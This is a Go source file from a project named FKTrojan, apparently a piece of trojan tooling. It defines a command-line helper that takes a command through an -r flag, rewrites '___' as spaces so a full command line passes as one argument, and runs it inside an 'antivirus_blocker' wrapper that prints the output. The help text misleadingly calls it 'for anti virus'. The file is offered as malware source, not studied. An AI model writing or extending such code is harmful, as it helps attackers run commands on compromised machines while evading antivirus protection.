package main

import (
	"FKTrojan/antivirus_blocker"
	. "FKTrojan/client_tools/common"
	"FKTrojan/common"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"strings"
)

func JsonPrintHelp() {

	app := AppUsage{
		Name:    ExeBaseName(),
		Version: "1.0.0",
		Desc:    "this is for anti virus",
		Parameters: []Parameter{
			{
				LongFmt:  "-r",
				ShortFmt: "-r",
				Example:  "type___c:\\windows\\system32\\drivers\\etc",
				Desc:     "run exe and parameter",
				Required: true,
				Type:     "string",
			},
		},
	}
	var b []byte
	if len(os.Args) >= 2 && os.Args[1] == "--HELP" {
		b, _ = json.Marshal(app)
	} else {
		b, _ = json.MarshalIndent(app, " ", " ")
	}
	fmt.Println(string(b))
}

func main() {
	if len(os.Args) > 1 {
		if os.Args[1] == "--help" || os.Args[1] == "-h" {
			JsonPrintHelp()
			os.Exit(0)
		}
	}
	runCmd := flag.String("r", "", "")
	flag.Parse()
	antivirus_blocker.Execute(func() (string, error) {
		stdout, stderr, err := common.RunExe(strings.Replace(*runCmd, "___", " ", -1))
		if stdout != "" {
			fmt.Printf("stdout:%s\n", stdout)
		}
		if stderr != "" {
			fmt.Printf("stderr:%s\n", stderr)
		}
		if err != nil {
			fmt.Printf("err:%s\n", stderr)
		}
		return "", nil
	})
}
